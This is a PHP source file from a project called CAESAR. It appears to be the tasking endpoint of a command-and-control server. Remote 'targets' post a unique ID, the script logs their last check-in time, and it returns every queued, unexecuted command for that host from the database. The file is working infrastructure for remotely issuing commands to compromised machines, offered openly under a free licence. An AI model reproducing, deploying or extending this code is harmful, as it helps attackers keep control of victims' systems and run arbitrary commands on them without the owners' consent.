<?php

	/*
		CAESAR

		Author : Michele '0blio' Cisternino
		Email  : miki.cisternino@gmail.com
		Github : https://github.com/0blio
	
		This project is released under the GPL 3 license. 	
	*/

	include '../database/connection.php';

	if ($_SERVER['REQUEST_METHOD'] == 'POST') {
		if (isset($_POST['unique_id'])) {
			$unique_id = $_POST['unique_id'];
			$datetime = date("Y-m-d H:i:s");

			// Updating last request time
			$db -> table ('targets') -> eq('unique_id', $unique_id) -> update (['last_request' => $datetime]);

			// Selecting non-executed tasks for the remote host
			// SELECT tasks.command FROM tasks INNER JOIN targets ON tasks.id = targets.id WHERE targets.unique_id = ''
			$results = $db -> table ('tasks') -> columns ('command', 'task_id') -> join('targets', 'id', 'user_id') -> eq ('targets.unique_id', $unique_id) -> eq ('tasks.executed', 0) -> findAll();

			foreach ($results as $result) {
				echo '<command>' . $result['command'] . '</command>';
				echo '<task_id>' . $result['task_id'] . '</task_id>';
			}
		}
	}
